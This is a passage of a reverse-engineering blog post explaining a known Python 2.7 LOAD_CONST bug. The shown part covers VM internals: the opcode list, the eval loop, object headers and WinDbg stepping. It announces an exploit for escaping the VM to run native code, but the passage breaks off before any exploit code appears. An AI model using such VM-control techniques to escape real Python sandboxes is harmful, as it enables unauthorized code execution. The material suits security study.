
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Deep dive into Python's VM: Story of LOAD_CONST bug - Diary of a reverse-engineer</title>
  <meta name="author" content="Axel Souchet, Jonathan Salwan, Jérémy Fetiveau">

  
  <meta name="description" content="Introduction A year ago, I&rsquo;ve written a Python script to leverage a bug in Python&rsquo;s virtual machine: the idea was to fully control the &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://doar-e.github.io/blog/2014/04/17/deep-dive-into-pythons-vm-story-of-load_const-bug">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="Diary of a reverse-engineer" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <script src="/javascripts/jquery.tableofcontents.min.js" type="text/javascript"></script>
  <script src="/javascripts/generate-toc.js" type="text/javascript"></script>

  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="https://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="https://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
<link href='https://fonts.googleapis.com/css?family=Fjalla+One' rel='stylesheet' type='text/css'>
  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-43481215-1']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>



  <style>
    p { text-align: justify; }
  </style>

</head>
<body   class="collapse-sidebar sidebar-footer" >
  <header role="banner"><img src="/images/sigle-blanc-250px.jpg"></img>

	<div class="header-title"><a href="/">Diary of a reverse-engineer</a></div>


	<br><div class="header-subtitle">Because we like to play with weird things.</div>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:doar-e.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
  <li><a href="/about">About</a></li>
  <li><a href="/presentations">Presentations</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
  
    
      <h1 class="entry-title">Deep Dive Into Python's VM: Story of LOAD_CONST Bug</h1>
    
  
    
      <p class="meta">
        








  


<time datetime="2014-04-17T23:22:00-07:00" pubdate data-updated="true">Apr 17<span>th</span>, 2014</time>
        
      </p>
    
  </header>


<div class="entry-content"><h1>Introduction</h1>

<p>A year ago, I&rsquo;ve written a Python script to leverage a bug in Python&rsquo;s virtual machine: the idea was to fully control the Python virtual processor and after that to instrument the VM to execute native codes. The <a href="https://github.com/0vercl0k/stuffz/blob/master/Python's%20internals/python27_abuse_vm_to_execute_x86_code.py">python27_abuse_vm_to_execute_x86_code.py</a> script wasn&rsquo;t really self-explanatory, so I believe only a few people actually took some time to understood what happened under the hood. The purpose of this post is to give you an explanation of the bug, how you can control the VM and how you can turn the bug into something that can be more useful. It&rsquo;s also a cool occasion to see how works the Python virtual machine from a low-level perspective: what we love so much right?</p>

<p>But before going further, I just would like to clarify a couple of things:</p>

<ul>
<li>I haven&rsquo;t found this bug, this is quite old and <strong>known</strong> by the Python developers (trading safety for performance), so don&rsquo;t panic this is <strong>not</strong> a 0day or a new bug ; can be a cool CTF trick though</li>
<li>Obviously, YES I know we can also &ldquo;escape&rdquo; the virtual machine with the <a href="http://docs.python.org/2/library/ctypes.html">ctypes</a> module ; but this is a feature not a bug. In addition, ctypes is always &ldquo;removed&rdquo;  from sandbox implementation in Python</li>
</ul>


<p>Also, keep in mind I will focus Python 2.7.5 x86 on Windows ; but obviously this is adaptable for other systems and architectures, so this is left as an exercise to the interested readers.
All right, let&rsquo;s move on to the first part: this one will focus the essentials about the VM, and Python objects.</p>

<div class='entry-content-toc'></div>




<!--more-->


<h1>The Python virtual processor</h1>

<h2>Introduction</h2>

<p>As you know, Python is a (really cool) scripting language interpreted, and the source of the official interpreter is available here: <a href="http://www.python.org/ftp/python/2.7.6/Python-2.7.6.tgz">Python-2.7.6.tgz</a>. The project is written in C, and it is really readable ; so please download the sources, read them, you will learn a lot of things.
Now all the Python code you write is being <em>compiled</em>, at some point, into some &ldquo;bytecodes&rdquo;: let&rsquo;s say it&rsquo;s exactly the same when your C codes are compiled into x86 code. But the cool thing for us, is that the Python architecture is far more simpler than x86.</p>

<p>Here is a partial list of all available opcodes in Python 2.7.5:</p>

<figure class='code'><figcaption><span>Python275 available opcodes</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>In [5]: len(opcode.opmap.keys())
</span><span class='line'>Out[5]: 119
</span><span class='line'>In [4]: opcode.opmap.keys()
</span><span class='line'>Out[4]: [
</span><span class='line'> &#39;CALL_FUNCTION&#39;,
</span><span class='line'> &#39;DUP_TOP&#39;,
</span><span class='line'> &#39;INPLACE_FLOOR_DIVIDE&#39;,
</span><span class='line'> &#39;MAP_ADD&#39;,
</span><span class='line'> &#39;BINARY_XOR&#39;,
</span><span class='line'> &#39;END_FINALLY&#39;,
</span><span class='line'> &#39;RETURN_VALUE&#39;,
</span><span class='line'> &#39;POP_BLOCK&#39;,
</span><span class='line'> &#39;SETUP_LOOP&#39;,
</span><span class='line'> &#39;BUILD_SET&#39;,
</span><span class='line'> &#39;POP_TOP&#39;,
</span><span class='line'> &#39;EXTENDED_ARG&#39;,
</span><span class='line'> &#39;SETUP_FINALLY&#39;,
</span><span class='line'> &#39;INPLACE_TRUE_DIVIDE&#39;,
</span><span class='line'> &#39;CALL_FUNCTION_KW&#39;,
</span><span class='line'> &#39;INPLACE_AND&#39;,
</span><span class='line'> &#39;SETUP_EXCEPT&#39;,
</span><span class='line'> &#39;STORE_NAME&#39;,
</span><span class='line'> &#39;IMPORT_NAME&#39;,
</span><span class='line'> &#39;LOAD_GLOBAL&#39;,
</span><span class='line'> &#39;LOAD_NAME&#39;,
</span><span class='line'> ...
</span><span class='line'>]
</span></code></pre></td></tr></table></div></figure>


<h2>The virtual machine</h2>

<p>The Python VM is fully implemented in the function <a href="https://github.com/python-git/python/blob/master/Python/ceval.c#L667">PyEval_EvalFrameEx</a> that you can find in the <a href="https://github.com/python-git/python/blob/master/Python/ceval.c">ceval.c</a> file. The machine is built with a simple loop handling opcodes one-by-one with a bunch of switch-cases:</p>

<figure class='code'><figcaption><span>Python VM</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">PyObject</span> <span class="o">*</span>
</span><span class='line'><span class="nf">PyEval_EvalFrameEx</span><span class="p">(</span><span class="n">PyFrameObject</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">int</span> <span class="n">throwflag</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="c1">//...</span>
</span><span class='line'>  <span class="nl">fast_next_opcode:</span>
</span><span class='line'>  <span class="c1">//...</span>
</span><span class='line'>  <span class="cm">/* Extract opcode and argument */</span>
</span><span class='line'>  <span class="n">opcode</span> <span class="o">=</span> <span class="n">NEXTOP</span><span class="p">();</span>
</span><span class='line'>  <span class="n">oparg</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">HAS_ARG</span><span class="p">(</span><span class="n">opcode</span><span class="p">))</span>
</span><span class='line'>    <span class="n">oparg</span> <span class="o">=</span> <span class="n">NEXTARG</span><span class="p">();</span>
</span><span class='line'>  <span class="c1">//...</span>
</span><span class='line'>  <span class="k">switch</span> <span class="p">(</span><span class="n">opcode</span><span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="k">case</span> <span class="n">NOP</span>:
</span><span class='line'>      <span class="k">goto</span> <span class="n">fast_next_opcode</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">case</span> <span class="n">LOAD_FAST</span>:
</span><span class='line'>      <span class="n">x</span> <span class="o">=</span> <span class="n">GETLOCAL</span><span class="p">(</span><span class="n">oparg</span><span class="p">);</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="n">x</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">Py_INCREF</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
</span><span class='line'>        <span class="n">PUSH</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
</span><span class='line'>        <span class="k">goto</span> <span class="n">fast_next_opcode</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>      <span class="n">format_exc_check_arg</span><span class="p">(</span><span class="n">PyExc_UnboundLocalError</span><span class="p">,</span>
</span><span class='line'>        <span class="n">UNBOUNDLOCAL_ERROR_MSG</span><span class="p">,</span>
</span><span class='line'>        <span class="n">PyTuple_GetItem</span><span class="p">(</span><span class="n">co</span><span class="o">-&gt;</span><span class="n">co_varnames</span><span class="p">,</span> <span class="n">oparg</span><span class="p">));</span>
</span><span class='line'>      <span class="k">break</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">case</span> <span class="n">LOAD_CONST</span>:
</span><span class='line'>      <span class="n">x</span> <span class="o">=</span> <span class="n">GETITEM</span><span class="p">(</span><span class="n">consts</span><span class="p">,</span> <span class="n">oparg</span><span class="p">);</span>
</span><span class='line'>      <span class="n">Py_INCREF</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
</span><span class='line'>      <span class="n">PUSH</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
</span><span class='line'>      <span class="k">goto</span> <span class="n">fast_next_opcode</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">case</span> <span class="n">STORE_FAST</span>:
</span><span class='line'>      <span class="n">v</span> <span class="o">=</span> <span class="n">POP</span><span class="p">();</span>
</span><span class='line'>      <span class="n">SETLOCAL</span><span class="p">(</span><span class="n">oparg</span><span class="p">,</span> <span class="n">v</span><span class="p">);</span>
</span><span class='line'>      <span class="k">goto</span> <span class="n">fast_next_opcode</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">//...</span>
</span><span class='line'>  <span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The machine also uses a virtual stack to pass/return object to the different opcodes. So it really looks like an architecture we are used to dealing with, nothing exotic.</p>

<h2>Everything is an object</h2>

<p>The first rule of the VM is that it handles only Python objects. A Python object is basically made of two parts:</p>

<ul>
<li>The first one is a header, this header is mandatory for all the objects. Defined like that:</li>
</ul>


<figure class='code'><figcaption><span>Python object header</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#define PyObject_HEAD                   \</span>
</span><span class='line'><span class="cp">  _PyObject_HEAD_EXTRA                \</span>
</span><span class='line'><span class="cp">  Py_ssize_t ob_refcnt;               \</span>
</span><span class='line'><span class="cp">  struct _typeobject *ob_type;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define PyObject_VAR_HEAD               \</span>
</span><span class='line'><span class="cp">  PyObject_HEAD                       \</span>
</span><span class='line'><span class="cp">  Py_ssize_t ob_size; </span><span class="cm">/* Number of items in variable part */</span><span class="cp"></span>
</span></code></pre></td></tr></table></div></figure>


<ul>
<li>The second one is the variable part that describes the specifics of your object. Here is for example <em>PyStringObject</em>:</li>
</ul>


<figure class='code'><figcaption><span>PyStringObject</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">PyObject_VAR_HEAD</span>
</span><span class='line'>  <span class="kt">long</span> <span class="n">ob_shash</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">ob_sstate</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">ob_sval</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* Invariants:</span>
</span><span class='line'><span class="cm">   *     ob_sval contains space for &#39;ob_size+1&#39; elements.</span>
</span><span class='line'><span class="cm">   *     ob_sval[ob_size] == 0.</span>
</span><span class='line'><span class="cm">   *     ob_shash is the hash of the string or -1 if not computed yet.</span>
</span><span class='line'><span class="cm">   *     ob_sstate != 0 iff the string object is in stringobject.c&#39;s</span>
</span><span class='line'><span class="cm">   *       &#39;interned&#39; dictionary; in this case the two references</span>
</span><span class='line'><span class="cm">   *       from &#39;interned&#39; to this object are *not counted* in ob_refcnt.</span>
</span><span class='line'><span class="cm">   */</span>
</span><span class='line'><span class="p">}</span> <span class="n">PyStringObject</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now, some of you may ask themselves &ldquo;How does Python know the type of an object when it receives a pointer ?&rdquo;. In fact, this is exactly the role of the field <em>ob_type</em>. Python exports a <em>_typeobject</em> static variable that describes the type of the object. Here is, for instance the <em>PyString_Type</em>:</p>

<figure class='code'><figcaption><span>PyString_Type</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">PyTypeObject</span> <span class="n">PyString_Type</span> <span class="o">=</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">PyVarObject_HEAD_INIT</span><span class="p">(</span><span class="o">&amp;</span><span class="n">PyType_Type</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>  <span class="s">&quot;str&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="n">PyStringObject_SIZE</span><span class="p">,</span>
</span><span class='line'>  <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">),</span>
</span><span class='line'>  <span class="n">string_dealloc</span><span class="p">,</span>                             <span class="cm">/* tp_dealloc */</span>
</span><span class='line'>  <span class="p">(</span><span class="n">printfunc</span><span class="p">)</span><span class="n">string_print</span><span class="p">,</span>                    <span class="cm">/* tp_print */</span>
</span><span class='line'>  <span class="mi">0</span><span class="p">,</span>                                          <span class="cm">/* tp_getattr */</span>
</span><span class='line'>  <span class="c1">// ...</span>
</span><span class='line'><span class="p">};</span>
</span></code></pre></td></tr></table></div></figure>


<p>Basically, every string objects will have their <em>ob_type</em> fields pointing to that <em>PyString_Type</em> variable. With this cute little trick, Python is able to do type checking like that:</p>

<figure class='code'><figcaption><span>PyString_Check PyString_CheckExact</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#define Py_TYPE(ob)             (((PyObject*)(ob))-&gt;ob_type)</span>
</span><span class='line'><span class="cp">#define PyType_HasFeature(t,f)  (((t)-&gt;tp_flags &amp; (f)) != 0)</span>
</span><span class='line'><span class="cp">#define PyType_FastSubclass(t,f)  PyType_HasFeature(t,f)</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define PyString_Check(op) \</span>
</span><span class='line'><span class="cp">  PyType_FastSubclass(Py_TYPE(op), Py_TPFLAGS_STRING_SUBCLASS)</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define PyString_CheckExact(op) (Py_TYPE(op) == &amp;PyString_Type)</span>
</span></code></pre></td></tr></table></div></figure>


<p>With the previous tricks, and the <em>PyObject</em> type defined as follow, Python is able to handle in a generic-fashion the different objects:</p>

<figure class='code'><figcaption><span>PyObject</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_object</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">PyObject_HEAD</span>
</span><span class='line'><span class="p">}</span> <span class="n">PyObject</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>So when you are in your debugger and you want to know what type of object it is, you can use that field to identify easily the type of the object you are dealing with:</p>

<figure class='code'><figcaption><span>ob_type really useful when debugging</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt; dps 026233b0 l2
</span><span class='line'>026233b0  00000001
</span><span class='line'>026233b4  1e226798 python27!PyString_Type
</span></code></pre></td></tr></table></div></figure>


<p>Once you have done that, you can dump the variable part describing your object to extract the information you want.
By the way, all the native objects are implemented in the <a href="https://github.com/python-git/python/tree/master/Objects">Objects/</a> directory.</p>

<h3>Debugging session: stepping the VM. The hard way.</h3>

<p>It&rsquo;s time for us to go a little bit deeper, at the assembly level, where we belong ; so let&rsquo;s define a dummy function like this one:</p>

<figure class='code'><figcaption><span>dummy function</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">a</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">b</span> <span class="o">+</span> <span class="n">c</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now using the Python&rsquo;s <a href="http://docs.python.org/2/library/dis.html">dis</a> module, we can disassemble the function object <em>a</em>:</p>

<figure class='code'><figcaption><span>disassemble a</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>In [20]: dis.dis(a)
</span><span class='line'>2   0 LOAD_FAST                0 (b)
</span><span class='line'>    3 LOAD_FAST                1 (c)
</span><span class='line'>    6 BINARY_ADD
</span><span class='line'>    7 RETURN_VALUE
</span><span class='line'>In [21]: a.func_code.co_code
</span><span class='line'>In [22]: print &#39;&#39;.join(&#39;\\x%.2x&#39; % ord(i) for i in a.__code__.co_code)
</span><span class='line'>\x7c\x00\x00\x7c\x01\x00\x17\x53
</span><span class='line'>
</span><span class='line'>In [23]: opcode.opname[0x7c]
</span><span class='line'>Out[23]: &#39;LOAD_FAST&#39;
</span><span class='line'>In [24]: opcode.opname[0x17]
</span><span class='line'>Out[24]: &#39;BINARY_ADD&#39;
</span><span class='line'>In [25]: opcode.opname[0x53]
</span><span class='line'>Out[25]: &#39;RETURN_VALUE&#39;
</span></code></pre></td></tr></table></div></figure>


<p>Keep in mind, as we said earlier, that everything is an object ; so a function is an object, and bytecode is an object as well:</p>

<figure class='code'><figcaption><span>PyFunctionObject PyCodeObject</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">PyObject_HEAD</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_code</span><span class="p">;</span>  <span class="cm">/* A code object */</span>
</span><span class='line'>  <span class="c1">// ...</span>
</span><span class='line'><span class="p">}</span> <span class="n">PyFunctionObject</span><span class="p">;</span>
</span><span class='line'><span class="cm">/* Bytecode object */</span>
</span><span class='line'><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">PyObject_HEAD</span>
</span><span class='line'>    <span class="c1">//...</span>
</span><span class='line'>    <span class="n">PyObject</span> <span class="o">*</span><span class="n">co_code</span><span class="p">;</span>    <span class="cm">/* instruction opcodes */</span>
</span><span class='line'>    <span class="c1">//...</span>
</span><span class='line'><span class="p">}</span> <span class="n">PyCodeObject</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Time to attach my debugger to the interpreter to see what&rsquo;s going on in that weird-machine, and to place a conditional breakpoint on <a href="https://github.com/python-git/python/blob/master/Python/ceval.c#L667">PyEval_EvalFrameEx</a>.
Once you did that, you can call the dummy function:</p>

<figure class='code'><figcaption><span>windbg breakpoint</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt; bp python27!PyEval_EvalFrameEx+0x2b2 &quot;.if(poi(ecx+4) == 0x53170001){}.else{g}&quot;
</span><span class='line'>breakpoint 0 redefined
</span><span class='line'>0:000&gt; g
</span><span class='line'>eax=025ea914 ebx=00000000 ecx=025ea914 edx=026bef98 esi=1e222c0c edi=02002e38
</span><span class='line'>eip=1e0ec562 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei pl zr na pe nc
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
</span><span class='line'>python27!PyEval_EvalFrameEx+0x2b2:
</span><span class='line'>1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea914=7c
</span><span class='line'>
</span><span class='line'>0:000&gt; db ecx l8
</span><span class='line'>025ea914  7c 00 00 7c 01 00 17 53                          |..|...S
</span></code></pre></td></tr></table></div></figure>


<p>OK perfect, we are in the middle of the VM, and our function is being evaluated. The register <em>ECX</em> points to the bytecode being evaluated, and the first opcode is <em>LOAD_FAST</em>.</p>

<p>Basically, this opcode takes an object in the <em>fastlocals</em> array, and push it on the virtual stack. In our case, as we saw in both the disassembly and the bytecode dump, we are going to load the index 0 (the argument <em>b</em>), then the index 1 (argument <em>c</em>).</p>

<p>Here&rsquo;s what it looks like in the debugger ; first step is to load the <em>LOAD_FAST</em> opcode:</p>

<figure class='code'><figcaption><span>fetching the LOAD_FAST opcode</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt;
</span><span class='line'>eax=025ea914 ebx=00000000 ecx=025ea914 edx=026bef98 esi=1e222c0c edi=02002e38
</span><span class='line'>eip=1e0ec562 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei pl zr na pe nc
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
</span><span class='line'>python27!PyEval_EvalFrameEx+0x2b2:
</span><span class='line'>1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea914=7c
</span></code></pre></td></tr></table></div></figure>


<p>In <em>ECX</em> we have a pointer onto the opcodes of the function being evaluated, our dummy function. <em>0x7c</em> is the value of the <em>LOAD_FAST</em> opcode as we can see:</p>

<figure class='code'><figcaption><span>LOAD_FAST</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#define LOAD_FAST 124 </span><span class="cm">/* Local variable number */</span><span class="cp"></span>
</span></code></pre></td></tr></table></div></figure>


<p>Then, the function needs to check if the opcode has argument or not, and that&rsquo;s done by comparing the opcode with a constant value called <em>HAVE_ARGUMENT</em>:</p>

<figure class='code'><figcaption><span>Checking if the opcode has an argument</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt;
</span><span class='line'>eax=0000007c ebx=00000000 ecx=025ea915 edx=026bef98 esi=1e222c0c edi=00000000
</span><span class='line'>eip=1e0ec568 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei pl zr na pe nc
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
</span><span class='line'>python27!PyEval_EvalFrameEx+0x2b8:
</span><span class='line'>1e0ec568 83f85a          cmp     eax,5Ah
</span></code></pre></td></tr></table></div></figure>


<p>Again, we can verify the value to be sure we understand what we are doing:</p>

<figure class='code'><figcaption><span>opcode.HAVE_ARGUMENT</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
